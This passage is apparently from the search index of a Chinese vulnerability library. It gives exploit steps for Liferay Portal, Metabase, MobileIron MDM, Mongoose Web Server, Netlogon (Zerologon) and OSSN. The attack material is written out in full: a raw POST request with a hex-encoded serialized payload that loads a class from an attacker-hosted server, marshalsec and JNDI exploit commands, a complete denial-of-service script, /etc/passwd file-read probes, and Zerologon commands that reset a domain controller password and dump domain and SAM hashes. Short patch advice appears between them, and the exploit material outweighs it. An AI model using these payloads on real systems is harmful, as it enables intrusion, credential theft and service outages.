marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://192.168.207.1:9001/ LifExp\n1\n</code></pre> <p></p> <p>3.\u5f00\u542f\u672c\u5730\u76d1\u542c</p> <p>python3 -m http.server 9001</p> <p>\u7b49\u5f85expoilt\u540e\uff0c\u9776\u673a\u6765\u8bfb\u53d6\u6211\u4eec\u751f\u6210\u597d\u7684class\u6587\u4ef6</p> <p></p> <p>4.\u53d1\u9001payload</p> <p>POST /api/jsonws/invoke HTTP/1.1Host:  192.168.207.133:8080Content-Length: 1310Cache-Control:  max-age=0Upgrade-Insecure-Requests: 1Origin:  http://192.168.207.133:8080Content-Type:  application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/81.0.4044.122 Safari/537.36Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.207.133:8080/api/jsonws/invokeAccept-Encoding: gzip,  deflateAccept-Language: zh-CN,zh;q=0.9Cookie: COOKIE_SUPPORT=true;  GUEST_LANGUAGE_ID=zh_CN; JSESSIONID=87A005AED1F59A11F72BD5072F4CA2F3;  LFR_SESSION_STATE_20105=1587535682761Connection:  closecmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;tableId=1&amp;name=2&amp;type=3&amp;defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={\u201cuserOverridesAsString\u201d:\u201cHexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e3230372e313a393030312f740003466f6f;\u201d}</p> <p>WrapperConnectionPoolDataSource= \u540e\u9762\u7684\u5185\u5bb9\u6362\u6210\"2.\u751f\u6210payload \u4e2d\u5bf9\u5e94\u7684\u7ed3\u679c\"</p> <p></p> <p>\u6210\u529f\u5f39\u7a97~</p> <p>\u4e94\u3001\u4fee\u590d\u5efa\u8bae</p> <p>Liferay Portal 7.2\uff1a Liferay Portal 7.2.0\u6ca1\u6709\u53ef\u7528\u7684\u4fee\u8865\u7a0b\u5e8f\u3002\u800c\u662f\uff0c\u7528\u6237\u5e94\u5347\u7ea7\u5230Liferay Portal 7.3.1 GA2\u6216\u66f4\u9ad8\u7248\u672c\u3002</p> <p>Liferay Portal 7.1\uff1aLiferay Portal 7.1 GA4\uff087.1.3\uff09\u7684\u6e90\u4fee\u8865\u7a0b\u5e8f\u53ef\u5728GitHub\u4e0a\u83b7\u5f97\u3002\u53ef\u4ee5\u5728Patching Liferay Portal\u9875\u9762\u4e0a\u627e\u5230\u6709\u5173\u4f7f\u7528\u6e90\u8865\u4e01\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>Liferay Portal 7.0\uff1aLiferay Portal 7.0 GA7\uff087.0.6\uff09\u7684\u6e90\u4fee\u8865\u7a0b\u5e8f\u53ef\u5728GitHub\u4e0a\u83b7\u5f97\u3002\u53ef\u4ee5\u5728Patching Liferay Portal\u9875\u9762\u4e0a\u627e\u5230\u6709\u5173\u4f7f\u7528\u6e90\u8865\u4e01\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>Liferay Portal 6.2\uff1aLiferay Portal 6.2 GA6\uff086.2.5\uff09\u7684\u6e90\u4fee\u8865\u7a0b\u5e8f\u53ef\u5728GitHub\u4e0a\u83b7\u5f97\u3002\u53ef\u4ee5\u5728Patching Liferay Portal\u9875\u9762\u4e0a\u627e\u5230\u6709\u5173\u4f7f\u7528\u6e90\u8865\u4e01\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u8f6c\u8f7d\u81eahttps://mp.weixin.qq.com/s/A1w03zOClJDG1fl-MBrm_g</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","title":"CVE-2021-41277 Metabase \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Metabase\u662f\u7f8e\u56fdMetabase\u516c\u53f8\u7684\u4e00\u4e2a\u5f00\u6e90\u6570\u636e\u5206\u6790\u5e73\u53f0\u3002</p> <p>Metabase \u4e2d\u5b58\u5728\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u4ea7\u54c1\u7684 admin-\uff1esettings-\uff1emaps-\uff1ecustom maps-\uff1eadd a map \u64cd\u4f5c\u7f3a\u5c11\u6743\u9650\u9a8c\u8bc1\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u83b7\u5f97\u654f\u611f\u4fe1\u606f\u3002</p> <ul> <li>CNNVD\u7f16\u53f7\uff1aCNNVD-202111-1565</li> <li> <p>\u5371\u5bb3\u7b49\u7ea7\uff1a\u8d85\u5371</p> </li> <li> <p>CVE\u7f16\u53f7\uff1aCVE-2021-41277</p> </li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#fofaappmetabase","title":"FOFA\u641c\u7d22app=\"Metabase\"","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#pocbaseurlapigeojsonurlfileetcpasswd","title":"POC\uff1a{{BaseURL}}/api/geojson?url=file:/etc/passwd","text":"<p>\u4f8b\uff1a</p> <p></p> <p>\u8fd4\u56de\u7801\uff1a200</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#xraypoc","title":"xrayPOC","text":"<pre><code>name: poc-yaml-Metabase-FileInclusio-com\nrules:\n  - method: GET\n    path: '/api/geojson?url=file:/etc/passwd'\n    headers:\n      User-Agent: &gt;-\n        Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;\n        Trident/5.0)\n    follow_redirects: true\n    expression: |\n      response.status==200\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Mobilelron/MobileIron%20MDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%20EXP/","title":"MobileIron MDM \u672a\u6388\u6743RCE EXP","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Mobilelron/MobileIron%20MDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%20EXP/#_1","title":"\u6b65\u9aa4","text":"<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C \"&lt;Command&gt;\" java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://&lt;server-ip&gt;:1099/&lt;codebase&gt; &gt; exp python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService'</code>  EXP \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1jna0ZY-8BqRETUkYiJr5RQ \u63d0\u53d6\u7801\uff1anh3f</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Mongoose%20Web%20Server/Mongoose%20Web%20Server%206.9%20-%20Denial%20of%20Service/","title":"Mongoose Web Server 6.9   Denial of Service","text":"<p>**|**\u6f0f\u6d1e\u6765\u6e90 </p> <p>https://www.exploit-db.com/exploits/45819</p> <p>\u200b                                                 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Mongoose%20Web%20Server/Mongoose%20Web%20Server%206.9%20-%20Denial%20of%20Service/#exp","title":"**|**\u6f0f\u6d1eEXP","text":"<pre><code># Exploit Title: Mongoose Web Server 6.9 - Denial of Service (PoC)\n# Dork: N/A\n# Date: 2018-11-11\n# Exploit Author: Ihsan Sencan\n# Vendor Homepage: https://cesanta.com/binary.html\n# Software Link: https://backend.cesanta.com/cgi-bin/api.cgi?act=dl&amp;os=win\n# Version: 6.9\n# Category: Dos\n# Tested on: WiN7_x64/KaLiLinuX_x64\n# CVE: N/A\n\n# POC: \n# 1)\n\n#!/usr/bin/python\nimport socket\n\nprint \"\"\"\n         \\\\\\|///\n       \\\\  - -  //\n        (  @ @ )\n ----oOOo--(_)-oOOo----\nMongoose Web Server 6.9\n    Ihsan Sencan\n ---------------Ooooo----\n                (   )\n       ooooO     ) /\n       (   )    (_/\n        \\ (\n         \\_)\n\"\"\"\nIp = raw_input(\"[Ip]: \")\nPort = 8080 # Default port\n\nd=[]\nc=0\nwhile 1:\n    try:\n        d.append(socket.create_connection((Ip,Port)))\n        d[c].send(\"BOOM\")\n        print \"Sie!\"\n        c+=1\n    except socket.error: \n        print \"Done!\"\n        raw_input()\n        break\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/","title":"Netlogon \u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff08CVE-2020-1472\uff09","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_1","title":"\u80cc\u666f","text":"<p>NetLogon\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff08CVE-2020-1472\uff09\u7684\u8be6\u7ec6\u4fe1\u606f\u4e0e\u9a8c\u8bc1\u811a\u672c\uff0c\u5bfc\u81f4\u6f0f\u6d1e\u98ce\u9669\u9aa4\u7136\u63d0\u5347\u3002\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7NetLogon\u8fdc\u7a0b\u534f\u8bae\uff08MS-NRPC\uff09\u5efa\u7acb\u4e0e\u57df\u63a7\u5236\u5668\u8fde\u63a5\u7684 \u5b89\u5168\u901a\u9053\u65f6\uff0c\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u3002\u6b64\u6f0f\u6d1e\u4e3a\u5fae\u8f6f8\u6708\u8865\u4e01\u66f4\u65b0\u65f6\u62ab\u9732\uff0cCVSS\u8bc4\u5206\u4e3a10\uff0c\u5f71\u54cd\u5e7f\u6cdb\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\u8fdb\u884c\u9632\u62a4\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_2","title":"\u53d7\u5f71\u54cd\u7248\u672c","text":"<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation)</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_3","title":"\u6f0f\u6d1e\u68c0\u6d4b","text":"<p>poc \u94fe\u63a5\uff1a<code>https://pan.baidu.com/s/1_RpVEA4W_Lo_ildh-FdqKQ</code> \u63d0\u53d6\u7801\uff1atilx \u53d7\u5f71\u54cd\u7248\u672c\u4e3b\u673a\uff0c\u68c0\u6d4b\u9a8c\u8bc1\u7ed3\u679c\u5982\u4e0b\uff1a </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_4","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>1.\u91cd\u7f6e\u5bc6\u7801\uff0c\u83b7\u53d6\u57df\u5185\u6240\u6709\u7684\u7528\u6237hash\uff0c\u5229\u7528exp\uff1a`https://github.com/dirkjanm/CVE-2020-1472<code>` py -3 cve-2020-1472-exploit.py dc-01 192.169.1.253</code>2.Dump\u57df\u63a7\u5236\u4e0a\u7684hash<code>py -3 secretsdump.py xxxxx/dc-01\\$@192.168.1.253 -no-pass</code>3.\u5229\u7528\u83b7\u53d6\u5230\u7684\u7ba1\u7406\u5458hash\u8fdc\u7a0b\u8fde\u63a5\u5bfc\u51fasam\u6570\u636e\u5e93\u4e2d\u539f\u6765\u7684\u8ba1\u7b97\u673ahash``` py -3 wmiexec.py -hashes [hash] xxxx/administrator@192.168.1.253 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg saveHKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f  sam.save del /f security.save exit</p> <p>py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL  \u4ece\u800c\u83b7\u53d6\u5230MACHINE.ACC\uff1axxxxxxxxxxxxxxxxxxx  <code>4.\u6062\u590dntds.dit\u4e2d\u7684\u8ba1\u7b97\u673ahash\u5e76\u9a8c\u8bc1\uff1a`https://github.com/risksense/zerologon` \u9700\u8981\u6ce8\u610f\u7684\u662f\u6700\u540e\u7684hash\u4f7f\u7528\u7684\u662f\u4e0a\u56fe\u83b7\u53d6\u5230\u7684MACHINE.ACC\u201d:\u201d\u540e\u9762\u7684\u90e8\u5206\u3002</code> py -3 reinstall_original_pw.py dc-01 192.168.253.163 [\u4e0a\u4e00\u6b65\u83b7\u53d6\u5230\u7684hash]  <code>5.\u6700\u540e\u9a8c\u8bc1\u5bc6\u7801\u662f\u5426\u5df2\u7ecf\u6539\u56de\u53bb\uff0c\u6ce8\u610f\u7ed3\u5c3e\u662f$\u3002</code> py -3 secretsdump xxxx/administrator:admin123#@!..@192.168.1.253 -just-dc-user dc-01$ </p> <pre><code>#### \u6f0f\u6d1e\u9632\u62a4\n\n1)\u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5fae\u8f6f\u5b98\u65b9\u5df2\u9488\u5bf9\u53d7\u652f\u6301\u7684\u4ea7\u54c1\u7248\u672c\u53d1\u5e03\u4e86\u4fee\u590d\u6b64\u6f0f\u6d1e\u7684\u5b89\u5168\u8865\u4e01\uff0c\u5f3a\u70c8\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5b89\u88c5\u8865\u4e01\u8fdb\u884c\u9632\u62a4\uff0c\u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a `https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472` 2\uff09\u5176\u4ed6\u9632\u62a4\u63aa\u65bd \u5728\u5b89\u88c5\u66f4\u65b0\u8865\u4e01\u540e\uff0c\u8fd8\u53ef\u901a\u8fc7\u90e8\u7f72\u57df\u63a7\u5236\u5668 (DC) \u5f3a\u5236\u6a21\u5f0f\u4ee5\u514d\u53d7\u5230\u8be5\u6f0f\u6d1e\u5f71\u54cd\uff1a \u8bf7\u53c2\u8003\u5b98\u65b9\u6587\u6863\u8fdb\u884c\u914d\u7f6e\u300a\u5982\u4f55\u7ba1\u7406\u4e0e CVE-2020-1472 \u76f8\u5173\u7684 Netlogon \u5b89\u5168\u901a\u9053\u8fde\u63a5\u7684\u66f4\u6539\u300b\uff1a `https://support.microsoft.com/zh-cn/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc`\n\n#### \u6ce8\u610f\u4e8b\u9879\n\n\u7531\u4e8e\u7f51\u7edc\u95ee\u9898\u3001\u8ba1\u7b97\u673a\u73af\u5883\u95ee\u9898\u7b49\u539f\u56e0\uff0cWindows Update\u7684\u8865\u4e01\u66f4\u65b0\u53ef\u80fd\u51fa\u73b0\u5931\u8d25\u3002\u7528\u6237\u5728\u5b89\u88c5\u8865\u4e01\u540e\uff0c\u5e94\u53ca\u65f6\u68c0\u67e5\u8865\u4e01\u662f\u5426\u6210\u529f\u66f4\u65b0\u3002 \u8865\u4e01\u66f4\u65b0\u786e\u8ba4\uff1a \u53f3\u952e\u70b9\u51fbWindows\u56fe\u6807\uff0c\u9009\u62e9\u201c\u8bbe\u7f6e(N)\u201d\uff0c\u9009\u62e9\u201c\u66f4\u65b0\u548c\u5b89\u5168\u201d-\u201cWindows\u66f4\u65b0\u201d\uff0c\u67e5\u770b\u8be5\u9875\u9762\u4e0a\u7684\u63d0\u793a\u4fe1\u606f\uff0c\u4e5f\u53ef\u70b9\u51fb\u201c\u67e5\u770b\u66f4\u65b0\u5386\u53f2\u8bb0\u5f55\u201d\u67e5\u770b\u5386\u53f2\u66f4\u65b0\u60c5\u51b5\u3002 \u9488\u5bf9\u672a\u6210\u529f\u5b89\u88c5\u7684\u66f4\u65b0\uff0c\u53ef\u70b9\u51fb\u66f4\u65b0\u540d\u79f0\u8df3\u8f6c\u5230\u5fae\u8f6f\u5b98\u65b9\u4e0b\u8f7d\u9875\u9762\uff0c\u5efa\u8bae\u7528\u6237\u70b9\u51fb\u8be5\u9875\u9762\u4e0a\u7684\u94fe\u63a5\uff0c\u8f6c\u5230\u201cMicrosoft\u66f4\u65b0\u76ee\u5f55\u201d\u7f51\u7ad9\u4e0b\u8f7d\u72ec\u7acb\u7a0b\u5e8f\u5305\u5e76\u5b89\u88c5\u3002\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_5","title":"\u6f14\u793a\u622a\u56fe","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Netlogon/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#exp","title":"exp","text":"<p>exp\u76ee\u524d\u5df2\u7ecf\u516c\u5e03\uff0c\u5730\u5740\u4e3a  https://github.com/blackarrowsec/redteam-research</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/","title":"OSSN\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE 2020 10560\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_1","title":"\u3010\u6f0f\u6d1e\u8be6\u60c5\u3011","text":"<ul> <li>CVE-2020-10560 OSSN\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u95ee\u9898\u51fa\u73b0\u5728Open Source Social  Network(OSSN)5.3\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5bf9Site_Key\u5b9e\u65bd\u66b4\u529b\u7834\u89e3\u653b\u51fb\u6765\u4e3acomponents/OssnComments/ossn_com.php\u548clibraries/ossn.lib.upgrade.php\u63d2\u5165\u7279\u5236\u7684URL\uff0c\u7136\u540e\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_2","title":"\u3010\u73af\u5883\u642d\u5efa\u3011","text":"<ul> <li>1.\u9996\u5148\u901a\u8fc7git\u547d\u4ee4\u4ecegithub\u4e0a\u4e0b\u8f7dOSSN\u73af\u5883\uff0c\u8fd9\u91cc\u662f\u901a\u8fc7docker\u642d\u5efa\u6f0f\u6d1e\u590d\u73b0\u73af\u5883\u3002</li> </ul> <pre><code>git clone https://github.com/kevthehermit/CVE-2020-10560\n1\n</code></pre> <ul> <li>2.\u7136\u540e\u4f7f\u7528docker-compose\u7f16\u8bd1\u542f\u52a8OSSN\u73af\u5883\u3002    \u6ce8\u610f\uff1a\u5982\u679c\u8fd9\u91cc\u7f16\u8bd1\u65f6\uff0c\u63d0\u793aapi\u7248\u672c\u4e0d\u5339\u914d\uff0c\u5efa\u8bae\u5378\u8f7d\u5b89\u88c5\u65e7\u7248\u672cdocker\u3002</li> </ul> <ul> <li>3.\u7f16\u8bd1\u542f\u52a8\u5b8c\u6210\uff0c\u4f7f\u7528docker ps\u67e5\u770b\uff0c\u8868\u793a\u73af\u5883\u542f\u52a8\u6210\u529f\u3002</li> </ul> <ul> <li>4.\u4f7f\u7528\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95eeOSSN\u73af\u5883\uff0c\u9700\u8981\u8fdb\u884c\u5b89\u88c5\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002</li> </ul> <ul> <li>5.\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002</li> </ul> <ul> <li>6.\u8fdb\u884c\u7f51\u7ad9\u8bbe\u7f6e\uff0c\u9700\u8981\u586b\u5199\u6570\u636e\u5e93\u4fe1\u606f\u548c\u7f51\u7ad9\u4fe1\u606f\uff08\u7f51\u7ad9\u540d\u79f0\u548c\u90ae\u7bb1\u53ef\u4ee5\u968f\u4fbf\u586b\u5199\uff09\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002</li> </ul> <pre><code>  \u6ce8\u610f\uff1a\u8fd9\u91cc\u7684\u6570\u636e\u5e93\u4fe1\u606f\u586b\u5199\u5982\u4e0b\uff1a\n  DB: ossn\n  username: ossn\n  password: ossn \n  host: mysqlserver\n12345\n</code></pre> <ul> <li>7.\u521b\u5efa\u7ba1\u7406\u8d26\u6237\uff0c\u6309\u8981\u6c42\u586b\u5199\u5373\u53ef\u3002</li> </ul> <ul> <li>8.\u73af\u5883\u642d\u5efa\u5b8c\u6210\u3002</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_3","title":"\u3010\u9a8c\u8bc1\u8be6\u60c5\u3011","text":"<ul> <li> <p>\u9996\u5148\u9700\u8981\u83b7\u53d6site_key\u7684\u503c\uff0c\u5728\u5b9e\u9645\u73af\u5883\u4e2d\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u7206\u7834\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\uff0csite_key\u7206\u7834\u811a\u672c\u53c2\u8003\u94fe\u63a5\uff1a    https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery/releases</p> </li> <li> <p>\u56e0\u4e3a\u8fd9\u91cc\u6211\u4eec\u662f\u5728\u672c\u5730\u4f7f\u7528docker\u642d\u5efa\u7684\u590d\u73b0\u73af\u5883\uff0c\u6211\u4eec\u76f4\u63a5\u53d6\u6570\u636e\u5e93\u67e5\u8be2site_key\u503c\u5373\u53ef\u3002</p> </li> <li> <p>1.\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e00\u4e2amysql\u7684\u4e3b\u673a\uff0c\u4f7f\u7528mysql\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fde\u63a5\u6570\u636e\u5e93\uff08ossn/ossn\uff09\u3002</p> </li> </ul> <p></p> <ul> <li>2.\u67e5\u8be2\u6570\u636e\u5e93\u4e2d\u7684\u8868ossn_ site_settings\uff0c\u627e\u5230site_key\u7684\u503c\u3002</li> </ul> <p></p> <p></p> <ul> <li> </li> <li> <p>1.\u590d\u5236\u521a\u624d\u6211\u4eec\u4ecegithub\u4e0a\u4e0b\u8f7d\u7684poc\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\u3002</p> </li> </ul> <p></p> <ul> <li>2.\u7136\u540e\u4f7f\u7528python3\u6267\u884c\u811a\u672c\uff0c\u4f9d\u6b21\u586b\u5199site_key\uff0c\u8bfb\u53d6\u7684\u6587\u4ef6\uff0c\u76ee\u6807\u7f51\u7ad9\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u8bfb\u53d6\u5230\u4e86\u76ee\u6807\u7cfb\u7edf\u7684passwd\u6587\u4ef6\u5185\u5bb9\u3002</li> </ul> 